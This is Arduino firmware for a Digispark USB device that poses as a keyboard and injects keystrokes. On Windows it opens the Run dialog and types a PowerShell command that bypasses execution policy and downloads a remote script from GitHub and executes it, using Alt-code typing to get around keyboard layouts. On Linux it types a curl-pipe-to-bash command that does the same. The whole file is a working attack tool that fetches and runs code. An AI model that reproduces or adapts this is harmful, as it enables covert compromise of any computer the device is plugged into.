#include "DigiKeyboard.h"

#define LED_PIN      1          
#define SELECT_MS    4000UL     
#define ENUM_MS      1500UL     
#define NUMLOCK_BIT  0x01

#define KEY_KP_NUMLOCK 0x53
static const uchar KP_DIGIT[10] = {
  0x62, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61 // 0..9
};

static const char CMD_WIN[] =
  "powershell -NoProfile -ExecutionPolicy Bypass -Command \"iwr -useb "
  "https://raw.githubusercontent.com/sngzege/digispark-launcher/main/dispatch.ps1 | iex\"";

static const char CMD_LINUX[] =
  "curl -fsSL "
  "https://raw.githubusercontent.com/sngzege/digispark-launcher/main/dispatch.sh | bash";

static void rawReport(uchar mod, uchar key) {
  while (!usbInterruptIsReady()) { usbPoll(); _delay_ms(2); }
  DigiKeyboard.reportBuffer[0] = mod;
  DigiKeyboard.reportBuffer[1] = key;
  usbSetInterrupt(DigiKeyboard.reportBuffer, 2);
  while (!usbInterruptIsReady()) { usbPoll(); _delay_ms(2); }
}

static void ensureNumLock() {
  for (uint8_t i = 0; i < 40; i++) { DigiKeyboard.update(); _delay_ms(5); }
  if (!(DigiKeyboard.getLEDs() & NUMLOCK_BIT)) {
    DigiKeyboard.sendKeyStroke(KEY_KP_NUMLOCK);
    for (uint8_t i = 0; i < 40; i++) { DigiKeyboard.update(); _delay_ms(5); }
  }
}

static void altCode(unsigned char ascii) {
  char buf[5];
  buf[0] = '0';
  buf[1] = '0' + (ascii / 100) % 10;
  buf[2] = '0' + (ascii / 10) % 10;
  buf[3] = '0' + ascii % 10;
  buf[4] = 0;
  for (uint8_t i = 0; buf[i]; i++) {
    uchar kp = KP_DIGIT[buf[i] - '0'];
    rawReport(MOD_ALT_LEFT, kp);  
    rawReport(MOD_ALT_LEFT, 0);   
  }
  rawReport(0, 0);                
}


static void typeWin(const char* s) {
  for (const char* p = s; *p; p++) {
    char c = *p;
    bool safe = ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                 (c >= '0' && c <= '9') || c == ' ') && c != 'i' && c != 'I';
    if (safe) {
      DigiKeyboard.write((uint8_t)c);
    } else {
      altCode((unsigned char)c);
    }
  }
}

static void blinkConfirm(uint8_t times) {
  for (uint8_t i = 0; i < times; i++) {
    digitalWrite(LED_PIN, HIGH); DigiKeyboard.delay(120);
    digitalWrite(LED_PIN, LOW);  DigiKeyboard.delay(120);
  }
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  unsigned long t0 = millis();
  while (millis() - t0 < ENUM_MS) { DigiKeyboard.update(); DigiKeyboard.delay(5); }

  uchar prev = DigiKeyboard.getLEDs() & NUMLOCK_BIT;
  uint8_t presses = 0;
  unsigned long start = millis();
  while (millis() - start < SELECT_MS) {
    DigiKeyboard.update();
    uchar cur = DigiKeyboard.getLEDs() & NUMLOCK_BIT;
    if (cur != prev) { presses++; prev = cur; }
    digitalWrite(LED_PIN, ((millis() / 150) % 2) ? HIGH : LOW);
    DigiKeyboard.delay(5);
  }
  digitalWrite(LED_PIN, LOW);

  bool isLinux = (presses >= 2);

  if (isLinux) {
    blinkConfirm(2);
  } else {
    digitalWrite(LED_PIN, HIGH); DigiKeyboard.delay(500); digitalWrite(LED_PIN, LOW);
  }

  DigiKeyboard.delay(600); 

  if (isLinux) {
  
    DigiKeyboard.print(CMD_LINUX);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  } else {
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(800);
    ensureNumLock();
    typeWin(CMD_WIN);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }
}

void loop() {
  DigiKeyboard.update(); 
}
